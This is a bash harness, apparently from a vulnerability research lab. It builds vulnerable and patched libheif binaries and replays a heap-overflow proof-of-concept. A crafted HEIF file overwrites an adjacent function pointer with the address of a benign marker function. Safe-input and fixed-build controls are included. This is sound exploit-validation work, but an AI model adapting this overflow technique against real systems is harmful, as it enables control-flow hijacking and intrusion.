#!/usr/bin/env bash
# W179: replay the file-derived valid-pointer benign-marker leg.
# Usage: run_pointer.sh VULN_BUILD_DIR FIXED_BUILD_DIR OUT_DIR
# Example build dirs: /tmp/libheif2shell-unci and /tmp/w179-fixed-unci.
set -u
V=$1
F=$2
OUT=$3
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/../../../.." && pwd)
SRC=$ROOT/lab/frontier/libheif2shell/src/libheif-v1.23.6
DRIVER=$ROOT/lab/frontier/libheif2shell/real/reencode_interpose_marker.cc
LIBS="$(pkg-config --libs x265 libjpeg zlib 2>/dev/null) -lsharpyuv -lbrotlidec -lbrotlienc -lbrotlicommon -ldl"
mkdir -p "$OUT"
BIN=$(mktemp -d /tmp/w179-pointer-bin.XXXXXX)
trap 'rm -rf "$BIN"' EXIT

build() {
  g++ -std=c++17 -g -O0 -no-pie -U_GNU_SOURCE -I"$SRC/libheif/api" -I"$1" \
    "$DRIVER" "$1/libheif/libheif.a" $LIBS -o "$2" || exit 2
}
build "$V" "$BIN/vuln-marker" || exit 2
build "$F" "$BIN/fixed-marker" || exit 2

ADDR=$(nm -C "$BIN/vuln-marker" | awk '/ benign_marker\(\)/{print $1}' | head -1)
[ -n "$ADDR" ] || { echo "no benign_marker address" >&2; exit 2; }
echo "benign_marker address=0x$ADDR"
python3 "$HERE/neighbour/make_pointer_row.py" "0x$ADDR" "$OUT/attack.heif" || exit 2

# Attack: the harness-created 512x64 frame sizes x265; the file's 64x65 frame
# overflows one row into the adjacent live object.
STOP_AFTER_ONE=1 SYNTH_FIRST=1 TW=512 TH=64 "$BIN/vuln-marker" \
  "$OUT/attack.heif" "$OUT/attack-out.heif" retain > "$OUT/attack.out" 2>&1
rc=$?; echo "$rc" > "$OUT/attack.rc"; echo "attack rc=$rc"
# Safe input control: same file, encoder sized to the native 64x65; no padding
# growth, no OOB row, the neighbour fn stays the control function.
STOP_AFTER_ONE=1 TW=64 TH=65 "$BIN/vuln-marker" \
  "$OUT/attack.heif" "$OUT/safe-out.heif" retain > "$OUT/safe.out" 2>&1
rc=$?; echo "$rc" > "$OUT/safe.rc"; echo "safe rc=$rc"
# Fixed pin control: same attack bytes and driver shape against 9ec655f.
STOP_AFTER_ONE=1 SYNTH_FIRST=1 TW=512 TH=64 "$BIN/fixed-marker" \
  "$OUT/attack.heif" "$OUT/fixed-out.heif" retain > "$OUT/fixed.out" 2>&1
rc=$?; echo "$rc" > "$OUT/fixed.rc"; echo "fixed rc=$rc"

sha256sum "$OUT/attack.heif"
grep -H -E 'GROOM|VICTIM|HEADER|POST|BENIGN_MARKER_CALLED|CONTROL_FN_UNCHANGED|rc=|error|Error' \
  "$OUT/attack.out" "$OUT/safe.out" "$OUT/fixed.out" || true
